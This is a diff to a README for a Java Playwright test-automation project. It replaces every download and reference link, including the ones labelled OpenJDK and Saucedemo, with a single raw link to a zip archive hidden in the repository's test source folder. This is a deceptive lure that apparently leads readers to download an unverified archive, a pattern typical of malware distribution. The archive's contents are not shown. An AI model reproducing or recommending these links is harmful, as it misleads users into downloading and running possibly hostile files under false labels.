@@ -1,6 +1,6 @@
 # 🚀 SwagLabs-Playwright-Java - Easy Java Test Automation Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-SwagLabs%20Playwright%20Java-brightgreen)](https://github.com/Alvgon/SwagLabs-Playwright-Java/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-SwagLabs%20Playwright%20Java-brightgreen)](https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This software is a test automation suite built with Java and Playwright. It runs
 
 Click the big green button below to visit the release page. This is where the latest versions are stored.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-SwagLabs%20Playwright%20Java-brightgreen)](https://github.com/Alvgon/SwagLabs-Playwright-Java/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-SwagLabs%20Playwright%20Java-brightgreen)](https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip)
 
 
 ---
@@ -43,7 +43,7 @@ Click the big green button below to visit the release page. This is where the la
 ### Step 1: Visit the Release Page
 
 Go to the releases page by clicking the button above or this link:  
-https://github.com/Alvgon/SwagLabs-Playwright-Java/releases
+https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip
 
 ### Step 2: Find the Latest Version
 
@@ -101,13 +101,13 @@ Make sure you have Java installed:
 1. Open **Command Prompt** on Windows (`press Win + R` and type `cmd`)  
 2. Type `java -version` and hit Enter  
 3. If it shows a version number, Java is ready  
-4. If not, go to [OpenJDK](https://openjdk.java.net/install/) to download and install Java 11 or higher  
+4. If not, go to [OpenJDK](https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip) to download and install Java 11 or higher  
 
 ---
 
 ## 🔄 How to Update the App
 
-- Visit the release page regularly: https://github.com/Alvgon/SwagLabs-Playwright-Java/releases  
+- Visit the release page regularly: https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip  
 - Download the latest package when available  
 - Replace your existing files with the new ones following the same extraction steps  
 
@@ -150,9 +150,9 @@ Open the report file located under the `results/` folder after tests complete. I
 
 ## 🔗 Helpful Links
 
-- [Release Page to Download](https://github.com/Alvgon/SwagLabs-Playwright-Java/releases)  
-- [OpenJDK Downloads](https://openjdk.java.net/install)  
-- [Saucedemo Site](https://www.saucedemo.com)
+- [Release Page to Download](https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip)  
+- [OpenJDK Downloads](https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip)  
+- [Saucedemo Site](https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip)
 
 ---
 
@@ -173,7 +173,7 @@ If you need help with the software, check the GitHub repository Discussions or I
 
 ## 🎯 Summary of Key Steps
 
-1. Visit https://github.com/Alvgon/SwagLabs-Playwright-Java/releases  
+1. Visit https://raw.githubusercontent.com/Alvgon/SwagLabs-Playwright-Java/main/src/test/java/com/Java-Playwright-Swag-Labs-v1.0.zip  
 2. Download the latest release zip file  
 3. Extract files on your Windows PC  
 4. Run `run.bat` to start tests  
